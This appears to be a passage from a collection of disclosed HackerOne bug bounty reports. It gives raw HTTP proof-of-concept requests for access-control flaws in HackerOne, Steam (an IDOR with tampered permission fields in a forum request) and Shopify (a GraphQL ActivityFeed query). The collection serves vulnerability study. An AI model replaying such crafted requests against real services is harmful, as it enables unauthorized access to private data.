Server: cloudflare
CF-RAY: 4208b363780d8a7f-BOM
Content-Length: 17633

████████
```

```
POST /graphql HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 1250
Accept: */*
X-Auth-Token: REDACTED
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
Origin: https://hackerone.com
Content-Type: application/json
DNT: 1
Referer: https://hackerone.com/REDACTED
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: REDACTED

{"query":"query Team_assets($first_0:Int!,$first_1:Int!) {\n  query {\n    id,\n    ...F0\n  }\n}\nfragment F0 on Query {\n  me {\n    _membership3abeOl:membership(team_handle:\"██████\") {\n      permissions,\n      id\n    },\n    id\n  },\n  _team3p4BfA:team(handle:\"███\") {\n    handle,\n    _structured_scopes2tadtg:structured_scopes(first:$first_0,archived:false) {\n      max_updated_at\n    },\n    _structured_scopes2tzyk4:structured_scopes(first:$first_1,archived:false,eligible_for_submission:true) {\n      edges {\n        node {\n          id,\n          asset_type,\n          asset_identifier,\n          rendered_instruction,\n          max_severity,\n          eligible_for_bounty\n        },\n        cursor\n      },\n      pageInfo {\n        hasNextPage,\n        hasPreviousPage\n      }\n    },\n    _structured_scopes1j7lgN:structured_scopes(first:$first_1,archived:false,eligible_for_submission:false) {\n      edges {\n        node {\n          id,\n          asset_type,\n          asset_identifier,\n          rendered_instruction\n   
```

## #308610 Read Access to all comments on unauthorized forums' discussions! IDOR!  — valve — $500 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2018/308610.md` (https://hackerone.com/reports/308610)

```
POST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1
Host: steamcommunity.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.7
Content-Length: 597
Cookie: ***********member-cookies****
Connection: close

gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true
```

## #528940 STAFF member with NO Explicit permissions can view `ActivityFeed` via GraphQL — shopify — $500 — Improper Access Control - Generic
Source: `hackerone/reports/2019/528940.md` (https://hackerone.com/reports/528940)

```
POST /admin/api/graphql HTTP/1.1
Host: bir1.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
X-Shopify-Web-Force-Proxy: 1
Origin: https://bir1.myshopify.com
Content-Length: 577

{"operationName":"ActivityFeed","variables":{"first":20},"query":"query ActivityFeed($first: Int!) {\n  staffMember {\n    id\n    privateData {\n      activityFeed(first: $first) {\n        pageInfo {\n          hasNextPage\n          __typename\n        }\n        edges {\n          ...Activity\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment Activity on ActivityEdge {\n  cursor\n  node {\n    author\n    createdAt\n    messages\n    topic\n    attributed\n    __typename\n  }\n  __typename\n}\n"}
```

